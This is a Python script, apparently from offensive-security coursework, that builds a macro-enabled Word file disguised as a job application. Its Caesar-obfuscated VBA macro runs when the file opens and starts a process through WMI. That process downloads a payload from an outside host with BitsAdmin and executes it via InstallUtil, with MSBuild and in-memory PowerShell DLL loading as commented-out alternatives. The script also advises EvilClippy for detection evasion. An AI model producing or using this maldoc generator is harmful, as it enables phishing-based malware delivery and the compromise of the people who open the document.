import aspose.words as aw

CAESAR_NUM = 17
DOC_NAME = "Job Application 53.doc"
VBA_MACRO = """
Function Pears(Beets)
    Pears = Chr(Beets - {CAESAR_NUM})
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Sub MyMacro()
    Dim Apples As String
    Dim Water As String
    If ActiveDocument.Name <> Nuts("{DOC_NAME}") Then
        Exit Sub
    End If
    
    Apples = "{CMD}"
    Water = Nuts(Apples)
    GetObject(Nuts("{OBJ}")).Get(Nuts("{GET}")).Create Water, Tea, Coffee, Napkins
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
"""
CMD = "cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"

#CMD = "cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/foo.msproj C:\\Windows\\tasks\\foo.msproj && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\tasks\\foo.msproj"

#CMD = """cmd.exe /c powershell "$d=(New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/DLL-Runner.dll');$a=[System.Reflection.Assembly]::Load($d);$c=$a.GetType('DLL_Runner.Class1');$m=$c.GetMethod('runner'); $m.Invoke(0, $null)" """ 

def encrypt_string(text):
    result = ""

    for i in range(len(text)):
        c = text[i]
        e = ord(text[i]) + CAESAR_NUM
        result += str(e).zfill(3)
    return result

def create_doc():
    VBA_DOCNAME=encrypt_string(DOC_NAME)
    #VBA_CMD = encrypt_string(CMD)
    VBA_OBJ = encrypt_string("winmgmts:")
    VBA_GET = encrypt_string("Win32_Process")

    CMD_ENC = encrypt_string(CMD)
    VBA_CMD_CHUNKS = [CMD_ENC[i:i+50] for i in range(0, len(CMD_ENC), 50)]

    VBA_CMD = "\" _ \n& \"".join(VBA_CMD_CHUNKS)

    doc = aw.Document()
#    doc = aw.Document("DocTemplate.docm")

    doc.compatibility_options.optimize_for(aw.settings.MsWordVersion.WORD2003)

    builder = aw.DocumentBuilder(doc)

    builder.writeln("Hello world!")

    project = aw.vba.VbaProject()
    project.name = "Aspose.Project"

    old_module = project.modules.get_by_name("ThisDocument")
    new_module = project.modules.get_by_name("ThisDocument").clone()

    new_module.source_code = VBA_MACRO.format(DOC_NAME=VBA_DOCNAME, CMD=VBA_CMD, OBJ=VBA_OBJ, GET=VBA_GET, CAESAR_NUM=CAESAR_NUM)

    print("VBA Code:")
    print(new_module.source_code)

    project.modules.remove(old_module)
    project.modules.add(new_module)

    doc.vba_project = project

    doc.save(DOC_NAME, aw.SaveFormat.DOCM)

def main():
    create_doc()

    print("Document saved as: "+DOC_NAME)
    print("Macro will run: " + CMD)
    print("Use EvilClippy to further hide detection")


if __name__ == "__main__":
    main()
